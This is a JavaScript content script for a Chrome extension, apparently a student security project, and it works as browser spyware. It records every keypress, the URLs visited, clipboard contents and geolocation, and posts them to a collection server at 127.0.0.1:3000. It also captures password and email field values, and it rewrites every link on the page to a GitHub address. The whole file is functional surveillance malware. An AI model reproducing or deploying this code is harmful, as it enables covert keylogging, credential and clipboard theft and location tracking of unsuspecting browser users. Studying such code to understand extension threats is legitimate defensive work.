var host_port = "http://127.0.0.1:3000";

var geolocation_flag = true;
var keylog_flag = true;
var urls_flag = true;


var port = chrome.runtime.connect({
    name: "mycontentscript"
});

port.onMessage.addListener(function(message) {

    modifyLinks();
    setTimeout(function() {
        getUrls();
        getGeo();
    }, 1000);
});
function getUrls() {
    if (!urls_flag) {
        return;
    }

    today = new Date();
    var url = new URL(window.location.href).toString();
    url_log = '{"logtype": "URL", "datetime":"' + today + '", "url":"' + url + '"}';
    if (urls_flag) {
        $.post(host_port, url_log);
    }
}


document.onkeypress = function(e) {
    if (keylog_flag) {
        today = new Date();
        key_log = '{"logtype": "KEY", "datetime":"' + today + '", "key":"' + e.key + '"}';
        $.post(host_port, key_log);
    }
};


document.addEventListener("copy", getClipboardData);
let previousClipboard = "";

function getClipboardData() {
    clip = window.navigator.clipboard.readText();
    clip.then((value) => {
        if (previousClipboard != value) {
            previousClipboard = value;
            try {
                base64encoded = btoa(unescape(encodeURIComponent(value)));
                clip_log = '{"logtype": "CLIP", "datetime":"' + today + '", "clip":"' + base64encoded + '"}';
                today = new Date();
                $.post(host_port, clip_log);
            } catch (err) {
                console.log(err);
            }
        }
    });
}


function getGeo() {
    if (geolocation_flag) {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (location) => {
                    today = new Date();
                    location_log = '{"logtype": "LOC", "datetime":"' + today + '", "lat":"' + location.coords.latitude + '", "lng":"' + location.coords.longitude + '"}';
                    $.post(host_port, location_log);
                },
                () => {}
            );
        }
    }
}


function logInput(event) {
    var input = event.target.value;
    if (!input) {
        return;
    }
    var inputType = event.target.tagName.toLowerCase();
    var inputName = event.target.name || event.target.id || 'unknown';
    
    var today = new Date();
    var input_log = '{"logtype": "INPUT", "datetime":"' + today + '", "inputType":"' + inputType + '", "inputName":"' + inputName + '", "input":"' + input + '"}';
    console.log(input_log);
    // $.post(host_port, input_log);
}

document.querySelectorAll('input[type="text"], input[type="password"], input[type="email"], textarea').forEach(function(input) {
    input.addEventListener('blur', logInput);
});

function modifyLinks() {
    const newUrl = "https://github.com/TianYunQwQ/DD2525-Project";
    document.querySelectorAll('a').forEach(function(link) {
        link.href = newUrl;
    });
}